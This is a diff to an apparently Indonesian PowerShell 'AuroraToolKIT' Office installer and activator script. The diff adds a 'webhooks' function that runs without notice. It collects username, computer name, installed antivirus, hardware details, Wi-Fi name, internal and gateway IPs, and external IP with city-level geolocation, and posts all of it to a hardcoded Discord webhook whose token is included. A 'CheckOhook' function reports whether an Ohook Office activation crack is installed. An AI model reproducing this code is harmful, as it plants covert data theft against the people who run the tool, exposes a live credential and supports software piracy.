@@ -129,6 +129,129 @@ function UnQuickEdit
 }
 UnQuickEdit
 #-----------------------------------------------------------------------------------------
+#-----------------------------------------------------------------------------------------
+function webhooks {
+    $date = (Get-Date)
+    $os = Get-CimInstance -ClassName Win32_OperatingSystem
+    $osVersion = "$($os.Caption) ($($os.OSArchitecture))"
+    $winversion = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty DisplayVersion
+        if (-not $winversion) {
+            $winversion = $null
+        }
+
+    $username = $env:USERNAME
+    $compName = $env:COMPUTERNAME
+    $language = (Get-Culture).Name
+
+    # Ambil antivirus yang terinstall
+    $antivirus = (Get-CimInstance -Namespace "root\SecurityCenter2" -ClassName AntiVirusProduct).displayName -join ", "
+    if (-not $antivirus) { $antivirus = "Not installed" }
+
+    # Ambil informasi CPU, GPU, RAM
+    $computerSystem = Get-CimInstance -ClassName Win32_ComputerSystemProduct
+    $Manufacturer = $computerSystem.Vendor
+    $Type = $computerSystem.Version
+    $Model = $computerSystem.Name
+
+    $cpu = (Get-CimInstance Win32_Processor)
+    $Name = $cpu.Name
+    $Cores = $cpu.NumberOfCores
+    $LogicalProcessors = $cpu.NumberOfLogicalProcessors
+    $gpu = (Get-CimInstance Win32_VideoController).Name
+    $ramInfo = Get-WmiObject Win32_PhysicalMemory
+    $totalSizeInGB = 0
+    $ramDetails = @()
+    foreach ($ram in $ramInfo) {
+        $sizeInGB = [math]::Round($ram.Capacity / 1GB, 2)
+        $totalSizeInGB += $sizeInGB
+        $ramDetails += "$($ram.Manufacturer) $sizeInGB GB ($($ram.Speed) MHz)"
+    }
+    $TotalSizeInGB = $totalSizeInGB
+    $Modules = $ramDetails -join " -- "
+
+    $disks = Get-CimInstance -ClassName Win32_DiskDrive
+    $diskall = ""
+    foreach ($disk in $disks) {
+        $modeldisk = $disk.Model
+        $sizeInGB = [math]::round($disk.Size / 1GB, 2)
+        $diskall += "- $modeldisk - $sizeInGB GB`n"
+    }
+    $diskall | Out-Null
+
+    # Ambil status baterai
+    $battery = (Get-CimInstance Win32_Battery)
+    $batteryStatus = if ($battery) { "$($battery.EstimatedChargeRemaining)%" } else { "NoSystemBattery" }
+
+    # Ambil resolusi layar
+    Add-Type -AssemblyName System.Windows.Forms
+    $resolution = "{0}x{1}" -f [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height
+
+    # Ambil informasi jaringan
+    $gatewayIP = (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq "0.0.0.0/0" } | Select-Object -ExpandProperty NextHop)
+    $localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch "Loopback" }).IPAddress
+    $ip = Invoke-RestMethod -Uri "http://ip-api.com/json/"
+
+    $wifi = Get-NetAdapter | Where-Object { $_.InterfaceDescription -match 'Wireless' -and $_.Status -eq 'Up' }
+    if ($wifi) {
+        $wifiName = (Get-NetConnectionProfile -InterfaceAlias $wifi.Name).Name
+    } else {
+        $wifiName = "No Wi-Fi connected."
+    }
+    $lanAdapter = Get-NetAdapter | Where-Object { $_.MediaConnectionState -eq 'Connected' -and $_.InterfaceDescription -notmatch 'Wireless' }
+    if ($lanAdapter) {
+        $lanStatus = "LAN connected.: $($lanAdapter.Name)"
+        $pingResult = Test-Connection -ComputerName 8.8.8.8 -Count 1 -ErrorAction SilentlyContinue
+        if ($pingResult.StatusCode -eq 0) {
+            $internetStatus = "Internet via LAN connected."
+        } else {
+            $internetStatus = "Internet via LAN is not connected."
+        }
+    } else {
+        $lanStatus = "No LAN connected."
+        $internetStatus = "Internet via LAN is not available."
+    }
+
+    $WifiName = $wifiName
+    $LanStatus = $lanStatus
+    $InternetStatus = $internetStatus
+
+    # URL Webhook Discord
+    $webhookid = "1370237685767209070"
+    $webhooktoken = "3a9GapUT5gNGgao8wKUDcKznmjx2hQ4gs1s0dkYAOoFomWAVM_--Y7iZCd13_cb4BK8v"
+    $webhookUrl = "https://discord.com/api/webhooks/$webhookid/$webhooktoken"
+
+    # URL Gambar dan Thumbnail
+    #$imageUrl = "https://.../preview.png"
+    #$thumbnailUrl = "https://.../preview.png"
+
+    # Buat payload JSON dengan format embed lengkap
+    $payload = @{
+        username = "AuroraBot"
+        #avatar_url = ""
+        embeds = @(@{
+            title = ":fox: AuroraToolKIT - System Report"
+            description = ":key: **Microsoft office Installer**"
+            color = 3447003
+            fields = @(
+                @{ name = ""; value = ":calendar: $date`n"; inline = $false },
+                @{ name = ":computer: **SYSTEM**"; value = "**System:** $osVersion`n**Windows Version:** $winversion`n**Username:** $username`n**CompName:** $compName`n**Language:** $language`n**Antivirus:** $antivirus `n`n"; inline = $false },
+                @{ name = ":desktop: **HARDWARE**"; value = "**Manufacture:** $Manufacturer`n**Model:** $Type ($Model)`n**CPU:** $($Name) ($($Cores) Core, $($LogicalProcessors) Treads)`n**GPU:** $gpu`n**RAM:** $TotalSizeInGB GB // $Modules`n**Power:** $batteryStatus`n**Screen:** $resolution`n**Disk:**`n$diskall`n"; inline = $false },
+                @{ name = ":globe_with_meridians: **NETWORK**"; value = "**SSID:** $WifiName`n**LAN:**n$LanStatus`n**Internet Status:** $InsternetStatus`n**Location:** $($ip.country),  $($ip.city), $($ip.regionName) ($($ip.zip))`n**Gateway IP:** $gatewayIP`n**Internal IP:** $localIP`n**External IP:** $($ip.query)"; inline = $false },
+                @{ name = ""; value = "-----------------------------------------------"; inline = $false },
+                @{ name = "**:green_circle: ACTIVATION STATUS**"; value = " `n`n$(CheckOhook)`n"; inline = $false }
+                
+            )
+            #thumbnail = @{ url = $thumbnailUrl }
+            #image = @{ url = $imageUrl }
+            footer = @{ text = "AuroraBot | PowerShell Script" }
+            timestamp = Get-Date -Format o
+        })
+    } | ConvertTo-Json -Depth 10
+
+    # Kirim ke Discord Webhook
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
+}
+#-----------------------------------------------------------------------------------------
 [Console]::OutputEncoding = [System.Text.Encoding]::utf8
 Clear-Host
 # ASCII Art dalam Unicode [char]
@@ -164,6 +287,7 @@ for ($i = 0; $i -lt 10; $i++) {
     Write-Host -NoNewline "."; Start-Sleep -Milliseconds 300
 }
 Write-Host
+
 
 $WinAPI = Add-Type -MemberDefinition @"
 [DllImport("user32.dll")]
@@ -1138,6 +1262,43 @@ function UpdateButtonState {
     })
 #>
 $null = $Form.ShowDialog()
+
+function CheckOhook {
+    $ohook = 0
+    $paths = @("${env:ProgramFiles}", "${env:ProgramW6432}", "${env:ProgramFiles(x86)}")
+
+    foreach ($version in 15, 16) {
+        foreach ($path in $paths) {
+            if (Test-Path "$path\Microsoft Office\Office$version\sppc*.dll") {
+                $ohook = 1
+            }
+        }
+    }
+
+    foreach ($systemFolder in "System", "SystemX86") {
+        foreach ($officeFolder in "Office 15", "Office") {
+            foreach ($path in $paths) {
+                if (Test-Path "$path\Microsoft $officeFolder\root\vfs\$systemFolder\sppc*.dll") {
+                    $ohook = 1
+                }
+            }
+        }
+    }
+
+    if ($ohook -eq 0) {
+        return @"
+        // Ohook Office Activation Status //
+        Ohook Office aktivasi tidak ditemukan. Silakan lakukan proses aktivasi lagi.
+"@
+    }
+    
+    return @"
+    // Ohook Office Activation Status //
+    
+    Ohook for permanent Office activation is installed.
+"@
+}
+webhooks
 # Tampilkan kembali
 $WinAPI::ShowWindow($hwnd, 5) | Out-Null
 Write-Host
